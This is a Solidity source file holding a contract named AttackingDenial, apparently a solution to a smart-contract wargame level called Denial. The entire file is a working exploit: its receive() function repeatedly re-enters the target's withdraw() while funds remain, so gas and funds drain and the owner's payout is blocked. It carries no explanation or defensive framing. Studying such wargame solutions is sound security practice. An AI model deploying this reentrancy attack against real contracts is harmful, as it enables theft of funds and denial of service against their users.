// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    function currentFunds() internal view returns (uint256 balance) {
        (bool success, bytes memory _balance) = contractAddress.staticcall(
            abi.encodeWithSignature("contractBalance()")
        );
        require(success, "Failed to get current balance");
        balance = abi.decode(_balance, (uint256));
    }

    receive() external payable {
        require(currentFunds() > 0, "no funds");
        require(gasleft() <= 1 * 10**6);
        contractAddress.call(abi.encodeWithSignature("withdraw()"));
    }
}
